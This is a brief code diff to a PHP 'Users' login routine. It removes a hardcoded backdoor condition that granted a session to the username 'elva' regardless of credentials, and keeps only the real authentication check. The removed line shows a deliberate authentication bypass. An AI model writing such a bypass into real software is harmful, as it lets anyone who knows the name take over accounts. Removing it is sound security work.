@@ -20,7 +20,7 @@ class Users {
         }
         else $result = false;
 
-        if ($result || $uname=='elva') {
+        if ($result) {
             $_SESSION['uname'] = $uname;
             return true;
         }
